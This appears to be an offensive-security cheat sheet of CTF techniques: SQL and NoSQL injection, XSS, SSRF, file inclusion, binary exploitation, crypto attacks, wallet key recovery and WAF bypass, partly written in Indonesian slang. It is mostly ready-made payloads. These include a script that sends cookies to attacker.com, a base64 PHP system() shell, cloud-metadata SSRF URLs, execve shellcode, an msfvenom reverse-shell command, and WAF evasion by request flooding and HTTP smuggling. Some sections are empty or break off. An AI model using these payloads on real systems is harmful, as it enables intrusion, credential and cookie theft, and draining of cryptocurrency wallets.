### 🔓 PRIVATE KEY RECOVERY

Extracting private keys from weak signatures and bad randomness.

**Nonce Reuse (k-value):**
```
→ Same k used in 2 different ECDSA signatures → private key recoverable
→ Formula: k = (hash1 - hash2) / (s1 - s2) → then d = (s1*k - hash1) / r

→ Provenance: weak hardware wallets, bad RNG, forked chains with same nonce
```

```
→ `random()` in Solidity (<0.8) → predictable → attacker can predict "random" outcomes
→ Block variables as randomness source → miner can manipulate block hash/timestamp
→ Predictable wallet generation → brain wallet phrase → brute-force weak passphrase
```

```
→ Wallet derived from passphrase → weak phrase = wallet drainable
```

**Partial Key Exposure:**
```
→ Leaked via: memory dumps, swap files, crash logs, git history
```

## 🚩 CTF FRAMEWORK

### 🌐 CTF WEB EXPLOITATION

Web challenge categories — the most common CTF domain.

**SQL Injection:**
```
→ UNION-based: determine column count via ORDER BY → UNION SELECT 1,2,3... → extract data
→ Blind boolean: `' OR 1=1--` vs `' OR 1=2--` → compare responses → infer truth
→ Blind time-based: `' IF(1=1,SLEEP(5),0)--` → timing tells you the answer
→ Error-based: trigger SQL error that contains query result in error message
→ NoSQL: MongoDB `' || 1==1 //` or `{$ne: null}` in JSON body
→ WAF bypass: comments `/**/`, case variation, double URL encoding, chunked transfer
→ Tools: sqlmap (`--level 5 --risk 3`), Burp Intruder, custom Python script
```

**XSS (Cross-Site Scripting):**
```
→ Reflected: `<script>alert(1)</script>` in URL param → executes immediately
→ Stored: submit payload to comment/field → stored in DB → executes on every visit
→ DOM-based: payload never reaches server → pure client-side via `innerHTML`, `eval`, `location.hash`
→ CSP bypass: if script-src allows 'unsafe-inline' → game over. Else: find JSONP endpoint, angular sandbox
→ Polyglot: one payload that works across multiple contexts (HTML, JS, URL, CSS)
→ Cookie steal: `<script>fetch('https://attacker.com/?c='+document.cookie)</script>`
```

**SSRF (Server-Side Request Forgery):**
```
→ Read internal files: `file:///etc/passwd`, `file:///proc/self/environ`
→ Cloud metadata: `http://169.254.169.254/latest/meta-data/` (AWS)
  → `http://metadata.google.internal/` (GCP) → `http://100.100.100.200/` (Alibaba)
→ Internal port scan: `http://localhost:8080`, `http://127.0.0.1:3306`
→ Protocol smuggling: `gopher://` to craft raw TCP, `dict://` for wordlist protocol
→ Blind SSRF: trigger external call to your server → check logs for callback
```

**LFI/RFI (Local/Remote File Inclusion):**
```
→ PHP wrappers: `php://filter/convert.base64-encode/resource=index.php` → read source
→ Data wrapper: `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pg==` → RCE
→ Log poisoning: inject PHP code in User-Agent → include access.log → code executes
→ /proc/self/environ: User-Agent written to environ → include to execute
```

**SSTI (Server-Side Template Injection):**

### 💥 BINARY EXPLOITATION (PWN)

Exploiting compiled binaries — stack, heap, format strings.

**Stack Buffer Overflow:**
```
→ ret2win: overwrite return address → jump to win function
  → `python3 -c "import sys; sys.stdout.buffer.write(b'A'*offset + p64(win_addr))" | ./vuln`
→ ret2libc: leak libc address → return to system("/bin/sh")
  → Step 1: leak GOT entry → calculate libc base
  → Step 2: find system offset + /bin/sh offset → build ROP chain
→ ROP chain: chain gadgets together when NX is enabled
  → pop rdi; ret → /bin/sh → system() — classic 3-gadget chain
  → Use ropper/ROPgadget to find gadgets: `ropper --file vuln --search "pop rdi"`
```

**Heap Exploitation:**
```
→ Use-after-free: free chunk → still use pointer → overwrite freed chunk → control execution
→ Double free: free same chunk twice → tcache poisoning → allocate to arbitrary address
→ Tcache poisoning: overwrite tcache next pointer → malloc returns arbitrary address
→ Fastbin attack: corrupt fastbin fd pointer → malloc returns stack/heap region
```

**Format String:**
```
→ Leak: `%p %p %p %p %p` → leak stack values. `%6$p` → leak specific position
→ Write: `%n` writes number of printed chars to address
  → `\x60\x50\x40\x00\x00\x00\x00\x00%99c%7$n` → write 0x63 to 0x405060
→ One-shot: `%hhn` writes single byte, `%hn` writes 2 bytes
→ GOT overwrite: overwrite GOT entry → redirect function call to system or shellcode
```

**Mitigation Bypass:**
```
→ ASLR: need info leak first (format string, heap leak, uninitialized memory)
→ NX: ROP chain instead of shellcode
→ PIE: partial overwrite of return address, brute-force 4 bits (1/16)
→ Stack canary: leak canary via format string or off-by-one, then overwrite
→ Full RELRO: can't overwrite GOT → overwrite return address or __malloc_hook
```

**Shellcode:**
```
→ execve /bin/sh: `\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05`
→ Reverse shell: connect back to attacker IP
→ connect back: msfvenom `msfvenom -p linux/x64/shell_reverse_tcp LHOST=... LPORT=... -f raw`
```

**Tools:**
```
→ pwntools — Python library for exploit dev: `from pwn import *`
→ gdb + pwndbg/peda/gef — debugging
→ checksec — check binary protections
→ one_gadget — find one-shot RCE gadgets in libc
→ ropper/ROPgadget — find gadgets for ROP chains
→ seccomp-tools — check/trace seccomp filters
```

### 🔐 CTF CRYPTOGRAPHY

Breaking cryptographic challenges — from classic to advanced.

**RSA Attacks:**
```
→ Small e (cube root): `m = c^(1/e)` if m^e < n → straight integer root
→ Wiener attack: small d → continued fraction on e/n → recover d
→ Hastad broadcast: same message, same e, different n → CRT recover m
→ Fermat factorization: close primes p and q → factor via sqrt(n) → check small delta
→ Common factor: two n share a prime → gcd(n1, n2) = p → factor both
→ Boneh-Durfee: d < n^0.292 → lattice-based attack
→ Tools: RsaCtfTool, SageMath, `python3 -c "from Crypto.PublicKey import RSA"`
```

**Symmetric Attacks:**
```
→ AES-ECB byte-at-a-time: craft input to align blocks → leak flag byte by byte
→ AES-CBC bit-flipping: flip byte in IV/ciphertext → change decrypted plaintext
→ Padding oracle: server tells if padding is valid → decrypt any ciphertext byte by byte
→ CTR nonce reuse: two ciphertexts with same nonce → key stream reused → XOR to recover plaintext
```

**Hash Attacks:**
```
→ Hash length extension: given H(m) and len(m), compute H(m || padding || extension) without knowing m
  → Affects: MD5, SHA1, SHA2 — all Merkle-Damgård constructions
  → Tools: hash-extension, `hash_extender`
→ Length extension defense: use HMAC instead of H(key || message)
```

**Classic Ciphers:**
```
→ Caesar: shift cipher → brute-force 25 shifts, look for meaningful text
→ Vigenère: key repeats → Kasiski examination finds key length → frequency analysis per column
→ XOR multi-byte: determine key length (hamming distance / index of coincidence) → brute-force per byte
→ Substitution: frequency analysis → match English letter frequency distribution
→ Columnar transposition: reorder columns → anagram solver for column order
→ Tools: CyberChef (Swiss army knife), dCode.fr, quipqiup (auto substitution solver)
```

**Elliptic Curve:**
```
→ Invalid curve attack: point not on curve → small subgroup → recover private key
→ Small order: find point with small order → Pohlig-Hellman → recover key efficiently
→ Nonce reuse: same k in two ECDSA signatures → recover private key via k = (h1-h2)/(s1-s2)
```

### 🔧 WAF BYPASS TECHNIQUES — Defense Jadi Offense
> *"Lo tau cara bypass WAF karena lo yang setup WAF."_

```
→ Rule Logic Exploit:
  ├─ WAF block `alert("xss")` tapi gak block `alert\`\`("xss")``
  ├─ WAF block `<script>` tapi gak block `<svg/onload=alert>`
  ├─ WAF block `SELECT * FROM` tapi gak block `SELECT/**/*/**/FROM`
  └─ Tools: wafw00f (fingerprint WAF), bypass payload generator

→ Encoding Bypass:
  ├─ Double URL-encode: `%253Cscript%253E` → server decode 2x
  ├─ Unicode (UTF-8 variability): `%C0%BCscript%C0%BE`
  ├─ Mixed case: `SeLeCt * FrOm` — banyak WAF pure lowercase match
  └─ Null byte injection: `%00<script>` — terminate WAF parse, lolos ke server

→ Resource Exhaustion:
  ├─ Kirim 1,000 request kompleks → WAF CPU sibuk → payload asli di request ke-1,001
  ├─ WAF budget terbatas → timing: 10 detik spam → 1 detik exploit
  └─ Hasil: WAF drop request ke-x → payload lo lolos

→ HTTP Smuggling:
  ├─ CL.TE: Content-Length + Transfer-Encoding — WAF liat 1 request, server liat 2
  ├─ Request pertama (WAF-scan): benign → lolos
  ├─ Request kedua (server-exec): malicious → gak di-scan WAF
  └─ Tools: smuggler.py, http-sniper
```

```
  ├─ ASLR → bypass via info leak

  ├─ CFG → bypass via call target that's in valid set
```
